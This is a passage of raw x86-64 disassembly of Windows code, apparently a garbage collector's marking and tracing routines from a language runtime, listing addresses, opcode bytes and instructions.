    696869c2:	89 da                	mov    %ebx,%edx
    696869c4:	48 83 c4 28          	add    $0x28,%rsp
    696869c8:	5b                   	pop    %rbx
    696869c9:	5e                   	pop    %rsi
    696869ca:	e9 7a fe ff ff       	jmp    0x69686849
    696869cf:	48 8b 0d 92 5e 10 00 	mov    0x105e92(%rip),%rcx        # 0x6978c868
    696869d6:	31 d2                	xor    %edx,%edx
    696869d8:	e9 6c fe ff ff       	jmp    0x69686849
    696869dd:	48 8b 0d 7c e7 0f 00 	mov    0xfe77c(%rip),%rcx        # 0x69785160
    696869e4:	31 d2                	xor    %edx,%edx
    696869e6:	e9 5e fe ff ff       	jmp    0x69686849
    696869eb:	48 8b 0d ce 40 0f 00 	mov    0xf40ce(%rip),%rcx        # 0x6977aac0
    696869f2:	31 d2                	xor    %edx,%edx
    696869f4:	e9 50 fe ff ff       	jmp    0x69686849
    696869f9:	48 8b 0d a0 ea 0f 00 	mov    0xfeaa0(%rip),%rcx        # 0x697854a0
    69686a00:	31 d2                	xor    %edx,%edx
    69686a02:	e9 42 fe ff ff       	jmp    0x69686849
    69686a07:	48 8b 0d 12 eb 0f 00 	mov    0xfeb12(%rip),%rcx        # 0x69785520
    69686a0e:	31 d2                	xor    %edx,%edx
    69686a10:	e9 34 fe ff ff       	jmp    0x69686849
    69686a15:	48 8b 0d 6c e6 0f 00 	mov    0xfe66c(%rip),%rcx        # 0x69785088
    69686a1c:	31 d2                	xor    %edx,%edx
    69686a1e:	e9 26 fe ff ff       	jmp    0x69686849
    69686a23:	56                   	push   %rsi
    69686a24:	53                   	push   %rbx
    69686a25:	48 83 ec 28          	sub    $0x28,%rsp
    69686a29:	48 89 ce             	mov    %rcx,%rsi
    69686a2c:	48 8b 49 30          	mov    0x30(%rcx),%rcx
    69686a30:	0f b6 da             	movzbl %dl,%ebx
    69686a33:	89 da                	mov    %ebx,%edx
    69686a35:	e8 0f fe ff ff       	call   0x69686849
    69686a3a:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
    69686a3e:	89 da                	mov    %ebx,%edx
    69686a40:	e8 04 fe ff ff       	call   0x69686849
    69686a45:	48 8b 4e 40          	mov    0x40(%rsi),%rcx
    69686a49:	89 da                	mov    %ebx,%edx
    69686a4b:	48 83 c4 28          	add    $0x28,%rsp
    69686a4f:	5b                   	pop    %rbx
    69686a50:	5e                   	pop    %rsi
    69686a51:	e9 f3 fd ff ff       	jmp    0x69686849
    69686a56:	48 8b 0d a3 e8 0f 00 	mov    0xfe8a3(%rip),%rcx        # 0x69785300
    69686a5d:	31 d2                	xor    %edx,%edx
    69686a5f:	e9 e5 fd ff ff       	jmp    0x69686849
    69686a64:	48 8b 0d d5 ae 0f 00 	mov    0xfaed5(%rip),%rcx        # 0x69781940
    69686a6b:	31 d2                	xor    %edx,%edx
    69686a6d:	e9 d7 fd ff ff       	jmp    0x69686849
    69686a72:	57                   	push   %rdi
    69686a73:	56                   	push   %rsi
    69686a74:	53                   	push   %rbx
    69686a75:	48 83 ec 20          	sub    $0x20,%rsp
    69686a79:	31 db                	xor    %ebx,%ebx
    69686a7b:	48 89 ce             	mov    %rcx,%rsi
    69686a7e:	0f b6 fa             	movzbl %dl,%edi
    69686a81:	48 85 f6             	test   %rsi,%rsi
    69686a84:	74 16                	je     0x69686a9c
    69686a86:	48 3b 1e             	cmp    (%rsi),%rbx
    69686a89:	7d 11                	jge    0x69686a9c
    69686a8b:	48 8b 4c de 10       	mov    0x10(%rsi,%rbx,8),%rcx
    69686a90:	89 fa                	mov    %edi,%edx
    69686a92:	48 ff c3             	inc    %rbx
    69686a95:	e8 af fd ff ff       	call   0x69686849
    69686a9a:	eb e5                	jmp    0x69686a81
    69686a9c:	48 83 c4 20          	add    $0x20,%rsp
    69686aa0:	5b                   	pop    %rbx
    69686aa1:	5e                   	pop    %rsi
    69686aa2:	5f                   	pop    %rdi
    69686aa3:	c3                   	ret
    69686aa4:	48 8b 0d 35 de 0f 00 	mov    0xfde35(%rip),%rcx        # 0x697848e0
    69686aab:	31 d2                	xor    %edx,%edx
    69686aad:	e9 97 fd ff ff       	jmp    0x69686849
    69686ab2:	48 8b 0d a7 5b 10 00 	mov    0x105ba7(%rip),%rcx        # 0x6978c660
    69686ab9:	31 d2                	xor    %edx,%edx
    69686abb:	e9 89 fd ff ff       	jmp    0x69686849
    69686ac0:	56                   	push   %rsi
    69686ac1:	53                   	push   %rbx
    69686ac2:	48 83 ec 28          	sub    $0x28,%rsp
    69686ac6:	48 89 ce             	mov    %rcx,%rsi
    69686ac9:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69686acd:	0f b6 da             	movzbl %dl,%ebx
    69686ad0:	89 da                	mov    %ebx,%edx
    69686ad2:	e8 72 fd ff ff       	call   0x69686849
    69686ad7:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    69686adb:	89 da                	mov    %ebx,%edx
    69686add:	e8 67 fd ff ff       	call   0x69686849
    69686ae2:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    69686ae6:	89 da                	mov    %ebx,%edx
    69686ae8:	48 83 c4 28          	add    $0x28,%rsp
    69686aec:	5b                   	pop    %rbx
    69686aed:	5e                   	pop    %rsi
    69686aee:	e9 56 fd ff ff       	jmp    0x69686849
    69686af3:	56                   	push   %rsi
    69686af4:	53                   	push   %rbx
    69686af5:	48 83 ec 28          	sub    $0x28,%rsp
    69686af9:	48 89 ce             	mov    %rcx,%rsi
    69686afc:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69686b00:	0f b6 da             	movzbl %dl,%ebx
    69686b03:	89 da                	mov    %ebx,%edx
    69686b05:	e8 3f fd ff ff       	call   0x69686849
    69686b0a:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    69686b0e:	89 da                	mov    %ebx,%edx
    69686b10:	e8 34 fd ff ff       	call   0x69686849
    69686b15:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    69686b19:	89 da                	mov    %ebx,%edx
    69686b1b:	e8 29 fd ff ff       	call   0x69686849
    69686b20:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    69686b24:	89 da                	mov    %ebx,%edx
    69686b26:	48 83 c4 28          	add    $0x28,%rsp
    69686b2a:	5b                   	pop    %rbx
    69686b2b:	5e                   	pop    %rsi
    69686b2c:	e9 18 fd ff ff       	jmp    0x69686849
    69686b31:	56                   	push   %rsi
    69686b32:	53                   	push   %rbx
    69686b33:	48 83 ec 28          	sub    $0x28,%rsp
    69686b37:	48 89 ce             	mov    %rcx,%rsi
    69686b3a:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69686b3e:	0f b6 da             	movzbl %dl,%ebx
    69686b41:	89 da                	mov    %ebx,%edx
    69686b43:	e8 01 fd ff ff       	call   0x69686849
    69686b48:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    69686b4c:	89 da                	mov    %ebx,%edx
    69686b4e:	e8 f6 fc ff ff       	call   0x69686849
    69686b53:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    69686b57:	89 da                	mov    %ebx,%edx
    69686b59:	e8 eb fc ff ff       	call   0x69686849
    69686b5e:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    69686b62:	89 da                	mov    %ebx,%edx
    69686b64:	48 83 c4 28          	add    $0x28,%rsp
    69686b68:	5b                   	pop    %rbx
    69686b69:	5e                   	pop    %rsi
    69686b6a:	e9 da fc ff ff       	jmp    0x69686849
    69686b6f:	56                   	push   %rsi
    69686b70:	53                   	push   %rbx
    69686b71:	48 83 ec 28          	sub    $0x28,%rsp
    69686b75:	48 89 ce             	mov    %rcx,%rsi
    69686b78:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69686b7c:	0f b6 da             	movzbl %dl,%ebx
    69686b7f:	89 da                	mov    %ebx,%edx
    69686b81:	e8 c3 fc ff ff       	call   0x69686849
    69686b86:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    69686b8a:	89 da                	mov    %ebx,%edx
    69686b8c:	e8 b8 fc ff ff       	call   0x69686849
    69686b91:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    69686b95:	89 da                	mov    %ebx,%edx
    69686b97:	e8 ad fc ff ff       	call   0x69686849
    69686b9c:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    69686ba0:	89 da                	mov    %ebx,%edx
    69686ba2:	48 83 c4 28          	add    $0x28,%rsp
    69686ba6:	5b                   	pop    %rbx
    69686ba7:	5e                   	pop    %rsi
    69686ba8:	e9 9c fc ff ff       	jmp    0x69686849
    69686bad:	56                   	push   %rsi
    69686bae:	53                   	push   %rbx
    69686baf:	48 83 ec 28          	sub    $0x28,%rsp
    69686bb3:	48 89 ce             	mov    %rcx,%rsi
    69686bb6:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69686bba:	0f b6 da             	movzbl %dl,%ebx
    69686bbd:	89 da                	mov    %ebx,%edx
    69686bbf:	e8 85 fc ff ff       	call   0x69686849
    69686bc4:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
    69686bc8:	89 da                	mov    %ebx,%edx
    69686bca:	e8 7a fc ff ff       	call   0x69686849
    69686bcf:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
    69686bd3:	89 da                	mov    %ebx,%edx
    69686bd5:	e8 6f fc ff ff       	call   0x69686849
    69686bda:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
    69686bde:	89 da                	mov    %ebx,%edx
    69686be0:	48 83 c4 28          	add    $0x28,%rsp
    69686be4:	5b                   	pop    %rbx
    69686be5:	5e                   	pop    %rsi
    69686be6:	e9 5e fc ff ff       	jmp    0x69686849
    69686beb:	eb c0                	jmp    0x69686bad
    69686bed:	eb be                	jmp    0x69686bad
    69686bef:	48 8b 0d 0a e5 0f 00 	mov    0xfe50a(%rip),%rcx        # 0x69785100
    69686bf6:	31 d2                	xor    %edx,%edx
    69686bf8:	e9 4c fc ff ff       	jmp    0x69686849
    69686bfd:	41 55                	push   %r13
    69686bff:	41 54                	push   %r12
    69686c01:	55                   	push   %rbp
    69686c02:	57                   	push   %rdi
    69686c03:	56                   	push   %rsi
    69686c04:	53                   	push   %rbx
    69686c05:	48 83 ec 28          	sub    $0x28,%rsp
    69686c09:	8a 02                	mov    (%rdx),%al
    69686c0b:	3c 02                	cmp    $0x2,%al
    69686c0d:	48 89 cb             	mov    %rcx,%rbx
    69686c10:	48 89 d7             	mov    %rdx,%rdi
    69686c13:	74 30                	je     0x69686c45
    69686c15:	3c 03                	cmp    $0x3,%al
    69686c17:	0f 84 99 00 00 00    	je     0x69686cb6
    69686c1d:	fe c8                	dec    %al
    69686c1f:	0f 85 b6 00 00 00    	jne    0x69686cdb
    69686c25:	48 03 5f 08          	add    0x8(%rdi),%rbx
    69686c29:	45 0f b6 c0          	movzbl %r8b,%r8d
    69686c2d:	48 8b 52 10          	mov    0x10(%rdx),%rdx
    69686c31:	48 89 d9             	mov    %rbx,%rcx
    69686c34:	48 83 c4 28          	add    $0x28,%rsp
    69686c38:	5b                   	pop    %rbx
    69686c39:	5e                   	pop    %rsi
    69686c3a:	5f                   	pop    %rdi
    69686c3b:	5d                   	pop    %rbp
    69686c3c:	41 5c                	pop    %r12
    69686c3e:	41 5d                	pop    %r13
    69686c40:	e9 a3 00 00 00       	jmp    0x69686ce8
    69686c45:	48 8b 42 20          	mov    0x20(%rdx),%rax
    69686c49:	41 0f b6 f0          	movzbl %r8b,%esi
    69686c4d:	31 ed                	xor    %ebp,%ebp
    69686c4f:	41 bd 00 00 40 11    	mov    $0x11400000,%r13d
    69686c55:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
    69686c59:	49 39 ec             	cmp    %rbp,%r12
    69686c5c:	7c 7d                	jl     0x69686cdb
    69686c5e:	48 8b 47 28          	mov    0x28(%rdi),%rax
    69686c62:	48 8b 04 e8          	mov    (%rax,%rbp,8),%rax
    69686c66:	80 38 01             	cmpb   $0x1,(%rax)
    69686c69:	74 10                	je     0x69686c7b
    69686c6b:	41 89 f0             	mov    %esi,%r8d
    69686c6e:	48 89 c2             	mov    %rax,%rdx
    69686c71:	48 89 d9             	mov    %rbx,%rcx
    69686c74:	e8 84 ff ff ff       	call   0x69686bfd
    69686c79:	eb 36                	jmp    0x69686cb1
    69686c7b:	48 8b 48 08          	mov    0x8(%rax),%rcx
    69686c7f:	4d 89 e9             	mov    %r13,%r9
    69686c82:	48 8b 50 10          	mov    0x10(%rax),%rdx
    69686c86:	48 01 d9             	add    %rbx,%rcx
    69686c89:	48 89 c8             	mov    %rcx,%rax
    69686c8c:	8a 4a 10             	mov    0x10(%rdx),%cl
    69686c8f:	49 d3 e9             	shr    %cl,%r9
    69686c92:	4c 89 c9             	mov    %r9,%rcx
    69686c95:	80 e1 01             	and    $0x1,%cl
    69686c98:	75 0d                	jne    0x69686ca7
    69686c9a:	41 89 f0             	mov    %esi,%r8d
    69686c9d:	48 89 c1             	mov    %rax,%rcx
    69686ca0:	e8 43 00 00 00       	call   0x69686ce8
    69686ca5:	eb 0a                	jmp    0x69686cb1
    69686ca7:	48 8b 08             	mov    (%rax),%rcx
    69686caa:	89 f2                	mov    %esi,%edx
    69686cac:	e8 98 fb ff ff       	call   0x69686849
    69686cb1:	48 ff c5             	inc    %rbp
    69686cb4:	eb a3                	jmp    0x69686c59
    69686cb6:	e8 cf e3 ff ff       	call   0x6968508a
    69686cbb:	48 85 c0             	test   %rax,%rax
    69686cbe:	74 1b                	je     0x69686cdb
    69686cc0:	45 0f b6 c0          	movzbl %r8b,%r8d
    69686cc4:	48 89 c2             	mov    %rax,%rdx
    69686cc7:	48 89 d9             	mov    %rbx,%rcx
    69686cca:	48 83 c4 28          	add    $0x28,%rsp
    69686cce:	5b                   	pop    %rbx
    69686ccf:	5e                   	pop    %rsi
    69686cd0:	5f                   	pop    %rdi
    69686cd1:	5d                   	pop    %rbp
    69686cd2:	41 5c                	pop    %r12
    69686cd4:	41 5d                	pop    %r13
    69686cd6:	e9 22 ff ff ff       	jmp    0x69686bfd
    69686cdb:	48 83 c4 28          	add    $0x28,%rsp
    69686cdf:	5b                   	pop    %rbx
    69686ce0:	5e                   	pop    %rsi
    69686ce1:	5f                   	pop    %rdi
    69686ce2:	5d                   	pop    %rbp
    69686ce3:	41 5c                	pop    %r12
    69686ce5:	41 5d                	pop    %r13
    69686ce7:	c3                   	ret
    69686ce8:	41 54                	push   %r12
    69686cea:	55                   	push   %rbp
    69686ceb:	57                   	push   %rdi
    69686cec:	56                   	push   %rsi
    69686ced:	53                   	push   %rbx
    69686cee:	48 83 ec 20          	sub    $0x20,%rsp
    69686cf2:	48 85 c9             	test   %rcx,%rcx
    69686cf5:	49 89 cc             	mov    %rcx,%r12
    69686cf8:	48 89 d7             	mov    %rdx,%rdi
    69686cfb:	0f 84 9a 00 00 00    	je     0x69686d9b
    69686d01:	f6 42 11 01          	testb  $0x1,0x11(%rdx)
    69686d05:	0f 85 90 00 00 00    	jne    0x69686d9b
    69686d0b:	8a 4a 10             	mov    0x10(%rdx),%cl
    69686d0e:	80 f9 1c             	cmp    $0x1c,%cl
    69686d11:	0f 87 84 00 00 00    	ja     0x69686d9b
    69686d17:	b8 01 00 00 00       	mov    $0x1,%eax
    69686d1c:	48 d3 e0             	shl    %cl,%rax
    69686d1f:	a9 10 00 01 08       	test   $0x8010010,%eax
    69686d24:	75 3f                	jne    0x69686d65
    69686d26:	a9 00 00 40 11       	test   $0x11400000,%eax
    69686d2b:	75 21                	jne    0x69686d4e
    69686d2d:	a9 00 00 06 00       	test   $0x60000,%eax
    69686d32:	74 67                	je     0x69686d9b
    69686d34:	48 8b 52 20          	mov    0x20(%rdx),%rdx
    69686d38:	45 0f b6 c0          	movzbl %r8b,%r8d
    69686d3c:	4c 89 e1             	mov    %r12,%rcx
    69686d3f:	48 83 c4 20          	add    $0x20,%rsp
    69686d43:	5b                   	pop    %rbx
    69686d44:	5e                   	pop    %rsi
    69686d45:	5f                   	pop    %rdi
    69686d46:	5d                   	pop    %rbp
    69686d47:	41 5c                	pop    %r12
    69686d49:	e9 af fe ff ff       	jmp    0x69686bfd
    69686d4e:	49 8b 0c 24          	mov    (%r12),%rcx
    69686d52:	41 0f b6 d0          	movzbl %r8b,%edx
    69686d56:	48 83 c4 20          	add    $0x20,%rsp
    69686d5a:	5b                   	pop    %rbx
    69686d5b:	5e                   	pop    %rsi
    69686d5c:	5f                   	pop    %rdi
    69686d5d:	5d                   	pop    %rbp
    69686d5e:	41 5c                	pop    %r12
    69686d60:	e9 e4 fa ff ff       	jmp    0x69686849
    69686d65:	48 8b 02             	mov    (%rdx),%rax
    69686d68:	41 0f b6 f0          	movzbl %r8b,%esi
    69686d6c:	31 ed                	xor    %ebp,%ebp
    69686d6e:	48 8b 5a 18          	mov    0x18(%rdx),%rbx
    69686d72:	48 99                	cqto
    69686d74:	48 f7 3b             	idivq  (%rbx)
    69686d77:	48 8d 58 ff          	lea    -0x1(%rax),%rbx
    69686d7b:	48 39 eb             	cmp    %rbp,%rbx
    69686d7e:	7c 1b                	jl     0x69686d9b
    69686d80:	48 8b 57 18          	mov    0x18(%rdi),%rdx
    69686d84:	41 89 f0             	mov    %esi,%r8d
    69686d87:	48 8b 0a             	mov    (%rdx),%rcx
    69686d8a:	48 0f af cd          	imul   %rbp,%rcx
    69686d8e:	48 ff c5             	inc    %rbp
    69686d91:	4c 01 e1             	add    %r12,%rcx
    69686d94:	e8 4f ff ff ff       	call   0x69686ce8
    69686d99:	eb e0                	jmp    0x69686d7b
    69686d9b:	48 83 c4 20          	add    $0x20,%rsp
    69686d9f:	5b                   	pop    %rbx
    69686da0:	5e                   	pop    %rsi
    69686da1:	5f                   	pop    %rdi
    69686da2:	5d                   	pop    %rbp
    69686da3:	41 5c                	pop    %r12
    69686da5:	c3                   	ret
    69686da6:	41 54                	push   %r12
    69686da8:	55                   	push   %rbp
    69686da9:	57                   	push   %rdi
    69686daa:	56                   	push   %rsi
    69686dab:	53                   	push   %rbx
    69686dac:	48 83 ec 20          	sub    $0x20,%rsp
    69686db0:	48 89 cb             	mov    %rcx,%rbx
    69686db3:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69686db7:	41 89 d0             	mov    %edx,%r8d
    69686dba:	4c 8b 49 30          	mov    0x30(%rcx),%r9
    69686dbe:	4d 85 c9             	test   %r9,%r9
    69686dc1:	75 0f                	jne    0x69686dd2
    69686dc3:	8a 51 10             	mov    0x10(%rcx),%dl
    69686dc6:	80 fa 16             	cmp    $0x16,%dl
    69686dc9:	74 1b                	je     0x69686de6
    69686dcb:	80 fa 18             	cmp    $0x18,%dl
    69686dce:	74 31                	je     0x69686e01
    69686dd0:	eb 7d                	jmp    0x69686e4f
    69686dd2:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
    69686dd6:	0f b6 d2             	movzbl %dl,%edx
    69686dd9:	48 83 c4 20          	add    $0x20,%rsp
    69686ddd:	5b                   	pop    %rbx
    69686dde:	5e                   	pop    %rsi
    69686ddf:	5f                   	pop    %rdi
    69686de0:	5d                   	pop    %rbp
    69686de1:	41 5c                	pop    %r12
    69686de3:	49 ff e1             	rex.WB jmp *%r9
    69686de6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
    69686dea:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
    69686dee:	45 0f b6 c0          	movzbl %r8b,%r8d
    69686df2:	48 83 c4 20          	add    $0x20,%rsp
    69686df6:	5b                   	pop    %rbx
    69686df7:	5e                   	pop    %rsi
    69686df8:	5f                   	pop    %rdi
    69686df9:	5d                   	pop    %rbp
    69686dfa:	41 5c                	pop    %r12
    69686dfc:	e9 e7 fe ff ff       	jmp    0x69686ce8
    69686e01:	48 89 dd             	mov    %rbx,%rbp
    69686e04:	48 83 c5 10          	add    $0x10,%rbp
    69686e08:	74 45                	je     0x69686e4f
    69686e0a:	48 8b 7b 10          	mov    0x10(%rbx),%rdi
    69686e0e:	31 f6                	xor    %esi,%esi
    69686e10:	45 0f b6 e0          	movzbl %r8b,%r12d
    69686e14:	48 ff cf             	dec    %rdi
    69686e17:	48 39 f7             	cmp    %rsi,%rdi
    69686e1a:	7c 33                	jl     0x69686e4f
    69686e1c:	48 8b 43 08          	mov    0x8(%rbx),%rax
    69686e20:	b9 10 00 00 00       	mov    $0x10,%ecx
    69686e25:	4c 8b 48 18          	mov    0x18(%rax),%r9
    69686e29:	49 8b 51 08          	mov    0x8(%r9),%rdx
    69686e2d:	e8 df e1 ff ff       	call   0x69685011
    69686e32:	45 89 e0             	mov    %r12d,%r8d
    69686e35:	49 8b 09             	mov    (%r9),%rcx
    69686e38:	4c 89 ca             	mov    %r9,%rdx
    69686e3b:	48 0f af ce          	imul   %rsi,%rcx
    69686e3f:	48 ff c6             	inc    %rsi
    69686e42:	48 01 e9             	add    %rbp,%rcx
    69686e45:	48 01 c1             	add    %rax,%rcx
    69686e48:	e8 9b fe ff ff       	call   0x69686ce8
    69686e4d:	eb c8                	jmp    0x69686e17
    69686e4f:	48 83 c4 20          	add    $0x20,%rsp
    69686e53:	5b                   	pop    %rbx
    69686e54:	5e                   	pop    %rsi
    69686e55:	5f                   	pop    %rdi
    69686e56:	5d                   	pop    %rbp
    69686e57:	41 5c                	pop    %r12
    69686e59:	c3                   	ret
    69686e5a:	57                   	push   %rdi
    69686e5b:	56                   	push   %rsi
    69686e5c:	53                   	push   %rbx
    69686e5d:	48 83 ec 20          	sub    $0x20,%rsp
    69686e61:	48 8d 79 68          	lea    0x68(%rcx),%rdi
    69686e65:	48 89 ce             	mov    %rcx,%rsi
    69686e68:	48 83 7e 18 00       	cmpq   $0x0,0x18(%rsi)
    69686e6d:	7e 46                	jle    0x69686eb5
    69686e6f:	48 8b 56 28          	mov    0x28(%rsi),%rdx
    69686e73:	48 8b 1a             	mov    (%rdx),%rbx
    69686e76:	48 83 23 fb          	andq   $0xfffffffffffffffb,(%rbx)
    69686e7a:	48 8b 46 18          	mov    0x18(%rsi),%rax
    69686e7e:	48 8b 4c c2 f8       	mov    -0x8(%rdx,%rax,8),%rcx
    69686e83:	48 ff c8             	dec    %rax
    69686e86:	48 89 0a             	mov    %rcx,(%rdx)
    69686e89:	48 89 46 18          	mov    %rax,0x18(%rsi)
    69686e8d:	48 83 3b 07          	cmpq   $0x7,(%rbx)
    69686e91:	77 d5                	ja     0x69686e68
    69686e93:	48 89 d9             	mov    %rbx,%rcx
    69686e96:	e8 d8 df ff ff       	call   0x69684e73
    69686e9b:	48 89 d9             	mov    %rbx,%rcx
    69686e9e:	ba 02 00 00 00       	mov    $0x2,%edx
    69686ea3:	e8 fe fe ff ff       	call   0x69686da6
    69686ea8:	48 89 da             	mov    %rbx,%rdx
    69686eab:	48 89 f9             	mov    %rdi,%rcx
    69686eae:	e8 3c eb ff ff       	call   0x696859ef
    69686eb3:	eb b3                	jmp    0x69686e68
    69686eb5:	b0 01                	mov    $0x1,%al
    69686eb7:	48 83 c4 20          	add    $0x20,%rsp
    69686ebb:	5b                   	pop    %rbx
    69686ebc:	5e                   	pop    %rsi
    69686ebd:	5f                   	pop    %rdi
    69686ebe:	c3                   	ret
    69686ebf:	53                   	push   %rbx
    69686ec0:	48 83 ec 20          	sub    $0x20,%rsp
    69686ec4:	48 89 cb             	mov    %rcx,%rbx
    69686ec7:	b9 00 20 00 00       	mov    $0x2000,%ecx
    69686ecc:	e8 e7 f6 ff ff       	call   0x696865b8
    69686ed1:	48 c7 43 08 ff 03 00 	movq   $0x3ff,0x8(%rbx)
    69686ed8:	00 
    69686ed9:	48 89 43 18          	mov    %rax,0x18(%rbx)
    69686edd:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
    69686ee4:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
    69686eeb:	00 
    69686eec:	48 83 c4 20          	add    $0x20,%rsp
    69686ef0:	5b                   	pop    %rbx
    69686ef1:	c3                   	ret
    69686ef2:	53                   	push   %rbx
    69686ef3:	48 83 ec 20          	sub    $0x20,%rsp
    69686ef7:	48 89 cb             	mov    %rcx,%rbx
    69686efa:	e8 a0 ed ff ff       	call   0x69685c9f
    69686eff:	48 89 d9             	mov    %rbx,%rcx
    69686f02:	48 83 c4 20          	add    $0x20,%rsp
    69686f06:	5b                   	pop    %rbx
    69686f07:	eb b6                	jmp    0x69686ebf
    69686f09:	55                   	push   %rbp
    69686f0a:	57                   	push   %rdi
    69686f0b:	56                   	push   %rsi
    69686f0c:	53                   	push   %rbx
    69686f0d:	48 83 ec 28          	sub    $0x28,%rsp
    69686f11:	48 89 cb             	mov    %rcx,%rbx
    69686f14:	48 83 7b 18 00       	cmpq   $0x0,0x18(%rbx)
    69686f19:	7f 1c                	jg     0x69686f37
    69686f1b:	48 8d 8b 90 2b 00 00 	lea    0x2b90(%rbx),%rcx
    69686f22:	31 f6                	xor    %esi,%esi
    69686f24:	e8 c9 ff ff ff       	call   0x69686ef2
    69686f29:	48 8b 43 30          	mov    0x30(%rbx),%rax
    69686f2d:	48 8b 6b 40          	mov    0x40(%rbx),%rbp
    69686f31:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
    69686f35:	eb 1a                	jmp    0x69686f51
    69686f37:	48 89 d9             	mov    %rbx,%rcx
    69686f3a:	e8 1b ff ff ff       	call   0x69686e5a
    69686f3f:	eb d3                	jmp    0x69686f14
    69686f41:	48 8b 54 f5 00       	mov    0x0(%rbp,%rsi,8),%rdx
    69686f46:	48 89 d9             	mov    %rbx,%rcx
    69686f49:	48 ff c6             	inc    %rsi
    69686f4c:	e8 0f f8 ff ff       	call   0x69686760
    69686f51:	48 39 fe             	cmp    %rdi,%rsi
    69686f54:	7e eb                	jle    0x69686f41
    69686f56:	48 89 d9             	mov    %rbx,%rcx
    69686f59:	e8 5c f8 ff ff       	call   0x696867ba
    69686f5e:	48 89 d9             	mov    %rbx,%rcx
    69686f61:	48 83 c4 28          	add    $0x28,%rsp
    69686f65:	5b                   	pop    %rbx
    69686f66:	5e                   	pop    %rsi
    69686f67:	5f                   	pop    %rdi
    69686f68:	5d                   	pop    %rbp
    69686f69:	e9 e1 eb ff ff       	jmp    0x69685b4f
    69686f6e:	53                   	push   %rbx
    69686f6f:	48 83 ec 20          	sub    $0x20,%rsp
    69686f73:	48 89 cb             	mov    %rcx,%rbx
    69686f76:	e8 a6 df ff ff       	call   0x69684f21
    69686f7b:	4c 8b 83 10 29 00 00 	mov    0x2910(%rbx),%r8
    69686f82:	48 39 83 70 2b 00 00 	cmp    %rax,0x2b70(%rbx)
    69686f89:	48 0f 4d 83 70 2b 00 	cmovge 0x2b70(%rbx),%rax
    69686f90:	00 
    69686f91:	4c 89 c1             	mov    %r8,%rcx
    69686f94:	48 89 83 70 2b 00 00 	mov    %rax,0x2b70(%rbx)
    69686f9b:	e8 43 df ff ff       	call   0x69684ee3
    69686fa0:	4c 89 c1             	mov    %r8,%rcx
    69686fa3:	48 89 43 68          	mov    %rax,0x68(%rbx)
    69686fa7:	e8 23 df ff ff       	call   0x69684ecf
    69686fac:	48 89 d9             	mov    %rbx,%rcx
    69686faf:	48 89 43 70          	mov    %rax,0x70(%rbx)
    69686fb3:	e8 cf f2 ff ff       	call   0x69686287
    69686fb8:	48 8b 43 30          	mov    0x30(%rbx),%rax
    69686fbc:	48 89 d9             	mov    %rbx,%rcx
    69686fbf:	48 39 83 78 2b 00 00 	cmp    %rax,0x2b78(%rbx)
    69686fc6:	48 0f 4d 83 78 2b 00 	cmovge 0x2b78(%rbx),%rax
    69686fcd:	00 
    69686fce:	48 ff 83 58 2b 00 00 	incq   0x2b58(%rbx)
    69686fd5:	48 89 83 78 2b 00 00 	mov    %rax,0x2b78(%rbx)
    69686fdc:	e8 79 fe ff ff       	call   0x69686e5a
    69686fe1:	84 c0                	test   %al,%al
    69686fe3:	74 4f                	je     0x69687034
    69686fe5:	48 8b 83 00 21 00 00 	mov    0x2100(%rbx),%rax
    69686fec:	48 39 43 08          	cmp    %rax,0x8(%rbx)
    69686ff0:	7f 42                	jg     0x69687034
    69686ff2:	48 89 d9             	mov    %rbx,%rcx
    69686ff5:	e8 0f ff ff ff       	call   0x69686f09
    69686ffa:	48 8b 05 ff ca 0f 00 	mov    0xfcaff(%rip),%rax        # 0x69783b00
    69687001:	ba 00 00 40 00       	mov    $0x400000,%edx
    69687006:	48 ff 83 60 2b 00 00 	incq   0x2b60(%rbx)
    6968700d:	48 01 c0             	add    %rax,%rax
    69687010:	48 3d 00 00 40 00    	cmp    $0x400000,%rax
    69687016:	48 0f 4c c2          	cmovl  %rdx,%rax
    6968701a:	48 39 83 68 2b 00 00 	cmp    %rax,0x2b68(%rbx)
    69687021:	48 89 43 08          	mov    %rax,0x8(%rbx)
    69687025:	48 0f 4d 83 68 2b 00 	cmovge 0x2b68(%rbx),%rax
    6968702c:	00 
    6968702d:	48 89 83 68 2b 00 00 	mov    %rax,0x2b68(%rbx)
    69687034:	48 89 d9             	mov    %rbx,%rcx
    69687037:	48 83 c4 20          	add    $0x20,%rsp
    6968703b:	5b                   	pop    %rbx
    6968703c:	e9 11 f5 ff ff       	jmp    0x69686552
    69687041:	53                   	push   %rbx
    69687042:	48 83 ec 20          	sub    $0x20,%rsp
    69687046:	48 8b 41 18          	mov    0x18(%rcx),%rax
    6968704a:	48 39 41 10          	cmp    %rax,0x10(%rcx)
    6968704e:	48 89 cb             	mov    %rcx,%rbx
    69687051:	7e 0d                	jle    0x69687060
    69687053:	48 8b 81 00 21 00 00 	mov    0x2100(%rcx),%rax
    6968705a:	48 39 41 08          	cmp    %rax,0x8(%rcx)
    6968705e:	7f 29                	jg     0x69687089
    69687060:	48 83 7b 60 00       	cmpq   $0x0,0x60(%rbx)
    69687065:	75 22                	jne    0x69687089
